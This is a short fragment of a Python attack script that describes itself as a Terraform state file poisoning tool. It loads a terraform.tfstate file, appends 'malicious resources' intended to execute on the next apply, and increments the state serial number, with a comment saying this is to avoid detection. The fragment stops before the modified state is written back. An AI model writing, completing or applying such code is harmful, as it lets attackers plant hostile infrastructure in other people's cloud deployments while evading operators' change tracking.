State file poisoning script - modifies terraform.tfstate to inject malicious resources
"""

import json
import hashlib
import os

def poison_state_file(state_path, malicious_resources):
    """Inject malicious resources into Terraform state file"""

    with open(state_path, 'r') as f:
        state = json.load(f)

    # Add malicious resources that will execute on next apply
    state['resources'].extend(malicious_resources)

    # Update serial number to avoid detection
    state['serial'] += 1

